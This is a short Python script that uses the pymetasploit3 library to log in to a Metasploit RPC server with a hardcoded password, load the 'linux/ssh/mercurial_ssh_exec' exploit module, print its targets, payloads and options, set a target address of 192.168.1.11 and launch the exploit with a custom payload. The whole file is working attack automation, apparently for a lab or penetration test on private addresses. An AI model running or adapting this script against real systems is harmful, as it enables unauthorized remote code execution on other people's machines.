#!/usr/bin/env python3

import sys
import time
import re
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

client = MsfRpcClient('msf',server='172.19.185.119',ssl=True)
#print ([m for m in dir(client) if not m.startswith('_')])

exploit = client.modules.use('exploit', 'linux/ssh/mercurial_ssh_exec')

print ("### Targets")
print (exploit.targets)
print ()

print ("### Target Payloads")
print (exploit.targetpayloads())
print ()

print ("### Target Options")
print (exploit.options)
print ()

print ("### Target Missing Required")
print (exploit.missing_required)
print ()

exploit["RHOSTS"]="192.168.1.11"

print ("### Run Options")
print (exploit.runoptions)
print ()

console_id = client.consoles.console().cid
console = client.consoles.console(console_id)
console.run_module_with_output(exploit,payload="generic/custom")
